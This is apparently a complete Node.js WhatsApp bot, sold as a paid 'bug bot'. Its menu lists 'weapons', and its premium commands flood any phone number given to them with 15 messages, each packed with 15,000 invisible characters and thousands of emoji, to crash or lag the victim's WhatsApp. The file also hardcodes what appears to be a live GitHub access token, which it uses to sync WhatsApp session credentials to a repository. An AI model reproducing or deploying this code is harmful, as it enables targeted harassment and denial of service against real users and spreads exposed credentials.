const { default: makeWASocket, useMultiFileAuthState, delay, fetchLatestBaileysVersion, DisconnectReason } = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const express = require("express");
const app = express();
const port = process.env.PORT || 3000;

// --- CONFIG ---
const ownerNumber = "94742271802"; 
const logoUrl = 'https://files.catbox.moe/07hh33.png'; 
const voiceUrl = 'https://files.catbox.moe/xk6low.mp4'; // <--- VOICE LINK එක මෙතනට
const GITHUB_TOKEN = "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"; // <--- GITHUB TOKEN
const GITHUB_REPO = "btest2619-sudo/Database-Md"; // <--- USERNAME/REPO_NAME
const SESSION_BRANCH = "session-data";

let premiumUsers = [ownerNumber]; 
const startTime = Date.now();

// --- GITHUB SYNC (හොස්ට් එක Restart වුණත් Session එක පවතියි) ---
async function uploadToGitHub(filePath, content) {
    try {
        const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/${filePath}`;
        let sha = null;
        try { const ex = await axios.get(url, { headers: { 'Authorization': `token ${GITHUB_TOKEN}` }, params: { ref: SESSION_BRANCH } }); sha = ex.data.sha; } catch (e) {}
        await axios.put(url, { message: `Update ${filePath}`, content: Buffer.from(content).toString('base64'), branch: SESSION_BRANCH, sha: sha || undefined }, { headers: { 'Authorization': `token ${GITHUB_TOKEN}` } });
    } catch (e) {}
}

async function loadSession() {
    try {
        const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/session`;
        const res = await axios.get(url, { headers: { 'Authorization': `token ${GITHUB_TOKEN}` }, params: { ref: SESSION_BRANCH } });
        if (!fs.existsSync('./session')) fs.mkdirSync('./session');
        for (const f of res.data) {
            const fileRes = await axios.get(f.download_url);
            fs.writeFileSync(`./session/${f.name}`, typeof fileRes.data === 'object' ? JSON.stringify(fileRes.data) : fileRes.data);
        }
    } catch (e) {}
}

// --- BOT START ---
async function startBot() {
    await loadSession();
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const client = makeWASocket({ auth: state, printQRInTerminal: false, logger: pino({ level: "silent" }), browser: ["CHALAH-BUG-BOT", "Chrome", "20.0"] });

    // Web Routes
    app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
    app.get('/pair', async (req, res) => {
        let code = await client.requestPairingCode(req.query.number.replace(/[^0-9]/g, ''));
        res.json({ code });
    });

    client.ev.on("connection.update", async (u) => {
        if (u.connection === "open") console.log("✅ CONNECTED!");
        if (u.connection === "close") startBot();
    });

    client.ev.on("messages.upsert", async (chat) => {
        const m = chat.messages[0];
        if (!m.message || m.key.fromMe) return;
        const from = m.key.remoteJid;
        const sender = m.key.participant || m.key.remoteJid;
        const sn = sender.split('@')[0];
        const isPrem = premiumUsers.includes(sn) || sn === ownerNumber;
        const body = m.message.conversation || m.message.extendedTextMessage?.text || "";
        const cmd = body.startsWith(".") ? body.slice(1).trim().split(" ")[0].toLowerCase() : "";
        const q = body.trim().split(" ").slice(1).join(" ");

        if (cmd === 'menu') {
            const menuText = `💀 *CHALAH BUG BOT 404* 💀\n\nRank: ${isPrem ? 'PREMIUM' : 'FREE'}\n\n*FREE WEAPONS*\n.uicrash | .locbomb | .pollbug\n\n*PREMIUM WEAPONS*\n.rip | .die | .full | .lag | .404 | .end | .hell\n\n_CONTACT ADMIN FOR PREMIUM_`;
            await client.sendMessage(from, { image: { url: logoUrl }, caption: menuText });
            await client.sendMessage(from, { audio: { url: voiceUrl }, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
        }

        // Premium Bug Logic (Example: .rip)
        if (['rip', 'die', 'full', 'lag', '404', 'end', 'hell'].includes(cmd)) {
            if (!isPrem) return m.reply("⚠️ BUY PREMIUM (Rs 1000) - CONTACT OWNER: 0742271802");
            m.reply(`💀 *[${cmd.toUpperCase()}] RELEASED...*`);
            const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            for(let i=0; i<15; i++) { await client.sendMessage(target, { text: "‌".repeat(15000) + "⚰️".repeat(3000) }); await delay(300); }
        }
    });

    client.ev.on("creds.update", async () => {
        await saveCreds();
        const files = fs.readdirSync('./session');
        for (const f of files) await uploadToGitHub(`session/${f}`, fs.readFileSync(`./session/${f}`, 'utf-8'));
    });
}

app.listen(port);
startBot();
